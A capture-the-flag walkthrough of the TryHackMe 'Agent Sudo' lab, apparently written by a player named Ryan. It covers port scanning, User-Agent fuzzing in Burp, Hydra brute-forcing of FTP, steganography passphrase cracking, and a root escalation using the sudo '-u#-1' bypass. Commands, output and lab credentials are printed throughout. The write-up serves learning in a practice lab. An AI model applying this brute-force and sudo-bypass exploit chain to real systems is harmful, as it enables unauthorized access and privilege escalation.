# THM - Agent Sudo

##### Ip: 10.10.132.28
##### Name: Agent Sudo
##### Rating: Easy

------------------------------------------------

![thm_agentsudo_pic.png](../assets/agent_sudo_assets/thm_agentsudo_pic.png)

#### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Agent_Sudo]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.132.28
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-18 15:12 CST
Warning: 10.10.132.28 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.132.28
Host is up (0.18s latency).
Not shown: 59955 closed tcp ports (reset), 5577 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.16 seconds
```

Looking at the site on port 80 we find the following message:

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

Capturing the request in Burp, and using `R` for the user-agent field, we get a new result:

thm_agentsudo_r.png

Ok, interesting. 

Let's create a list of letters we can use to spray in Burp:

```
A
B
C
D
E
F
G
<snip>
```

Sending the request to Intruder in Burp, pasting in the payload list, and starting the Sniper attack, we see that letter C has a 302 redirect:

thm_agentsudo_c.png

Forwarding the request we find a new note, alongside a name of chris:

thm_agentsudo_note.png

This is a nice little hint. We now have the username chris, and we know he has a weak password, so let's try brute forcing FTP with Hydra.

thm_agentsudo_hydra.png

### Exploitation

Cool, that worked. We now have the credentials `chris:crystal`. 

Let's use these to access FTP as chris.

```
┌──(ryan㉿kali)-[~/THM/Agent_Sudo]
└─$ ftp 10.10.132.28 
Connected to 10.10.132.28.
220 (vsFTPd 3.0.3)
Name (10.10.132.28:ryan): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62593|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *
mget To_agentJ.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||34734|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |********************************************************************************|   217        1.33 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (1.64 KiB/s)
mget cute-alien.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||54112|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |********************************************************************************| 33143      280.95 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (131.90 KiB/s)
mget cutie.png [anpqy?]? y
229 Entering Extended Passive Mode (|||28937|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |********************************************************************************| 34842      279.89 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (137.32 KiB/s)
ftp> bye
221 Goodbye.
```

Inside we find three files, let's use `mget *` to download these locally.

Looking at the note first, we find:

```
┌──(ryan㉿kali)-[~/THM/Agent_Sudo]
└─$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Trying to use `steghide` to look at the contents of the cute-alien.jpg file, we see it is passphrase protected.

```
┌──(ryan㉿kali)-[~/THM/Agent_Sudo]
└─$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
```

Let's use `stegseek` to crack this:

```
┌──(ryan㉿kali)-[~/THM/Agent_Sudo]
└─$ stegseek -sf cute-alien.jpg -wl /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```

Stegseek gave us an output file, so let's check that out:

```
┌──(ryan㉿kali)-[~/THM/Agent_Sudo]
└─$ cat cute-alien.jpg.out
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Ok, lets use these credentials to SSH in as James:

```
┌──(ryan㉿kali)-[~/THM/Agent_Sudo]
└─$ ssh james@10.10.132.28                                     
The authenticity of host '10.10.132.28 (10.10.132.28)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.28' (ED25519) to the list of known hosts.
james@10.10.132.28's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
```

We can now grab the user.txt flag:

thm_agentsudo_user.png

### Privilege Escalation

Running `sudo -l` to see what James can run with elevated permissions we find:

```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Cool, this should make for an easy root.

This is a good guide on abusing this: https://www.exploit-db.com/exploits/47502

We can simply run:

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
```

And elevate to root.

We can now grab the final flag:

thm_agentsudo_root.png

Thanks for following along!

-Ryan

--------------------------------------------------------------
